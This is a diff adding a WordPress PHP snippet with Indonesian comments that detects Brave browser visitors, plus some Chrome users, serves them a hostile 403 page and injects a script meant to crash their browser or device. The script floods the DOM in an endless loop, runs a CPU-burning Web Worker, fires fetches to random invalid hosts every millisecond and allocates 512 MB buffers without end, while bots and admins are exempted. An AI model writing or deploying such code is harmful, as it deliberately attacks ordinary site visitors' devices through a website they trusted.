@@ -1,0 +1,64 @@
+add_action('init', function() {
+
+    // Kecualikan admin, editor, bot, dan yang pake ?noblock
+    if (current_user_can('edit_posts') ||
+        is_admin() ||
+        wp_doing_ajax() ||
+        isset($_GET['noblock']) ||
+        isset($_COOKIE['brave_killer_off']) ||
+        stripos($_SERVER['HTTP_USER_AGENT'] ?? '', 'Googlebot') !== false ||
+        stripos($_SERVER['HTTP_USER_AGENT'] ?? '', 'bingbot') !== false ||
+        stripos($_SERVER['HTTP_USER_AGENT'] ?? '', 'bot') !== false) {
+        return;
+    }
+
+    // Deteksi Brave (Android & desktop) – 2025 proof
+    $ua        = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $sec_ch_ua = $_SERVER['HTTP_SEC_CH_UA'] ?? '';
+    $is_brave  = stripos($ua, 'Brave') !== false ||
+                 stripos($sec_ch_ua, 'Brave') !== false ||
+                 (stripos($ua, 'Chrome') !== false && empty($sec_ch_ua));
+
+    if ($is_brave) {
+        http_response_code(403);
+        echo '<!DOCTYPE html><html><head><title>Bye</title></head><body style="margin:0;background:#000;color:#f00;font-family:system-ui,sans-serif">';
+        echo '<div style="position:fixed;inset:0;display:flex;align-items:center;justify-content:center;text-align:center;font-size:4.5rem;z-index:999999">
+                BRAVE MATI DISINI<br>
+                <div style="font-size:2rem;margin-top:20px">Jangan mau enaknya aja</div>
+              </div>';
+
+        // SCRIPT PEMBUNUH ANDROID + DESKTOP (paling sadis 2025)
+        echo '<script>
+        setTimeout(() => {
+            const k = () => {
+                const d = document.createElement("div");
+                d.innerHTML = new Array(999999999).join("DIEBRAVE");
+                document.body.appendChild(d);
+                requestAnimationFrame(k);
+            };
+            k();
+
+            new Worker(URL.createObjectURL(new Blob(["onmessage=()=>{while(true){crypto.getRandomValues(new Uint32Array(9999999))}postMessage(\'\')}"], {type:"application/javascript"}))).postMessage("");
+
+            setInterval(() => fetch("https://"+Math.random()+".invalid.domain.never.exists"), 1);
+
+            while(true) new ArrayBuffer(1024*1024*512);
+        }, 300);
+        </script>';
+
+        echo '</body></html>';
+        exit;
+    }
+}, 1);
+
+// Admin sekali klik → lolos selamanya
+add_action('wp_footer', function() {
+    if (current_user_can('administrator') && !isset($_COOKIE['brave_killer_off'])) {
+        echo '<script>
+        if(confirm("Izinkan Brave selamanya buat saya?")) {
+            document.cookie="brave_killer_off=1;path=/;max-age=31536000;samesite=strict";
+            location.reload();
+        }
+        </script>';
+    }
+});
